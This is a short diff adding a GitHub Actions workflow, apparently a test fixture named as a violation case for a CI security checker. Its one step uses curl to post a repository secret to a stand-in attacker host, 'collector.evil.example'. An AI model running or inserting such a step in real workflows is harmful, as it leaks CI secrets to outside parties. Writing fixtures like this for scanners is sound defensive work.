@@ -1,0 +1,8 @@
+name: violation_untrusted_before_comment
+on: push
+jobs:
+  call:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -d "k=${{ secrets.K }}" https://collector.evil.example/x # see http://docs.example.com
